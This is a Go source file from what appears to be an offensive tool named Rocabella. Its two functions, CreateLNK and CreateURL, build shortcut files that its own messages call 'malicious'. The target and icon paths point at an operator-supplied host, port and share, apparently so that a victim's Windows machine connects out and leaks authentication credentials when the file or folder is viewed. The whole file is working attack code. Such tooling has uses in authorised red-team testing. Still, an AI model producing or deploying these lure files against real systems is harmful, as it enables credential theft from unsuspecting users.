package Manager

import (
	"Rocabella/Packages/Colors"
	"Rocabella/Packages/Output"
	"Rocabella/Packages/Templates"
	"Rocabella/Packages/Utils"
	"fmt"
	"time"

	"github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
)

// CreateLNK function
func CreateLNK(target string, output string, description string, port string, share string) {
	fmt.Printf("[+] Preparing your malicious LNK file...\n\n")

	// Set the target path
	target = "\\\\" + target + "@" + port + "\\" + share

	// Record the start time
	LNKCreationStartTime := time.Now()

	ole.CoInitializeEx(0, ole.COINIT_APARTMENTTHREADED|ole.COINIT_SPEED_OVER_MEMORY)
	defer ole.CoUninitialize()

	// Create an instance of the WScript Shell
	unknown, error := oleutil.CreateObject("WScript.Shell")
	if error != nil {
		fmt.Println("Error creating WScript Shell object:", error)
		return
	}
	defer unknown.Release()

	shell, error := unknown.QueryInterface(ole.IID_IDispatch)
	if error != nil {
		fmt.Println("Error querying IDispatch interface:", error)
		return
	}
	defer shell.Release()

	// Get the shortcut object
	shortcut, error := oleutil.CallMethod(shell, "CreateShortcut", output)
	if error != nil {
		fmt.Println("Error creating shortcut object:", error)
		return
	}

	// Set properties of the shortcut
	oleutil.PutProperty(shortcut.ToIDispatch(), "TargetPath", target)
	oleutil.PutProperty(shortcut.ToIDispatch(), "Description", description)
	oleutil.PutProperty(shortcut.ToIDispatch(), "IconLocation", target+",12")
	oleutil.PutProperty(shortcut.ToIDispatch(), "WindowStyle", 7)

	// Save the shortcut
	oleutil.CallMethod(shortcut.ToIDispatch(), "Save")

	// Record the end time
	LNKCreationEndTime := time.Now()

	// Call function named GetAbsolutePath
	outputAbsolute := Utils.GetAbsolutePath(output)

	// Calculate the duration
	LNKCreationDuration := LNKCreationEndTime.Sub(LNKCreationStartTime)

	fmt.Printf("[+] LNK shortcut successfully created!\n\n[+] Saved to %s\n\n[+] Completed in %s\n\n", Colors.BoldRed(outputAbsolute), LNKCreationDuration)
}

// CreateURL function
func CreateURL(target string, output string, url string, workingDir string, port string) {
	fmt.Printf("[+] Preparing your malicious URL file...\n\n")

	// Set the target path
	target = target + "@" + port

	// Record the start time
	URLCreationStartTime := time.Now()

	// Get the URL file template with provided values
	urlFileContent := Templates.GetURLFileTemplate(url, workingDir, target)

	// Record the end time
	URLCreationEndTime := time.Now()

	// Call function named GetAbsolutePath
	outputAbsolute := Utils.GetAbsolutePath(output)

	// Calculate the duration
	URLCreationDuration := URLCreationEndTime.Sub(URLCreationStartTime)

	// Call function named WriteToFile
	Output.WriteToFile(output, urlFileContent)

	fmt.Printf("[+] URL shortcut successfully created!\n\n[+] Saved to %s\n\n[+] Completed in %s\n\n", Colors.BoldRed(outputAbsolute), URLCreationDuration)
}
